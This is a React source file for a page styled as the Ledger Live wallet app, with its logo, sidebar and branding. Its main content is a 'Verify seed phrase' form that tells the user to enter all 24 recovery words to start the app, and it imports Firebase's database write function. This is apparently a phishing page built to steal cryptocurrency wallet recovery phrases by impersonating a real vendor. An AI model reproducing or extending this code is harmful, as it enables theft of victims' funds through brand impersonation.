import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import { HiOutlineArrowLongRight } from "react-icons/hi2";
import { PiDesktopTowerBold } from "react-icons/pi";
import { BsUsbPlug } from "react-icons/bs";
import { FaBluetoothB } from "react-icons/fa";
import { FaStar, FaStarHalf, FaDesktop, FaRightLong, FaArrowRightLong, FaCoins, FaTabletScreenButton, FaChevronRight, FaFacebook,FaReddit,FaTwitter,FaInstagram, FaLinkedin, FaYoutube, FaTiktok, FaDiscord, FaCcPaypal } from "react-icons/fa6";


import { FaDollarSign } from "react-icons/fa6";
import { FaUpload } from "react-icons/fa6";
import { FaDownload } from "react-icons/fa6";
import { FaTools } from "react-icons/fa";
import { IoSwapHorizontal } from "react-icons/io5";
import { BsGraphUp } from "react-icons/bs";
import { BsGraphUpArrow } from "react-icons/bs";
import { RiFileList3Fill } from "react-icons/ri";

import logoLive from './../../assets/img/ledger-live.png';


import {db} from './../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
function Verify() {

    return (<AppLayout>
        <Helmet>
            <title>Ledger Live</title>
        </Helmet>
        <div className='container-fluid'>

        <div className='row'>
                <div className='col-md-3 px20 py20 sidenav'>
                    <div className='text-center'>
                        <Link className="" href="#">
                                <img src={logoLive} alt="Logo" width="120" style={{filter: "invert(1)"}}  className="d-inline-block align-text-top" />
                        </Link>
                    </div>
                    
                  
                    <ul class="text-secondary my35 side-menu">

                <li>
                <BsGraphUp className='me20' /> Portfolio
                </li>
                <li>
                <BsGraphUpArrow className='me20' /> Market
                </li> 

                <li>
                <RiFileList3Fill className='me20' /> Accounts
                </li>

                <li>
                    <FaUpload className='me20' /> Send
                </li>
                <li>
                    <FaDownload className='me20' /> Receive
                </li>
                <li>
                <FaDollarSign className='me20' /> Buy/Sell
                </li>
                <li>
                <IoSwapHorizontal  className='me20'/> Swap
                </li>
                
                <li>
                <FaTools className='me20' /> Manager
                </li>
            </ul>
                    
                </div>
                <div className='col-md-9 bg-black p40'>
                    
                    <h3 className='text-white fw-bold'>VERIFY SEED PHRASE OF YOUR DEVICE</h3>
                    <p className='text-secondary mt20'>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
                    <p className='text-secondary mt20'>**Ledger does not keep a copy of your recovery phrase.</p>
                    <p className='text-secondary mt20'>**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>

                    <input type="text"
                required className="form-control" placeholder=""
                style={{background:"transparent"}}
                />

                </div>
            </div>

            
            


           
            
        </div>
    </AppLayout>)
}

export default Verify
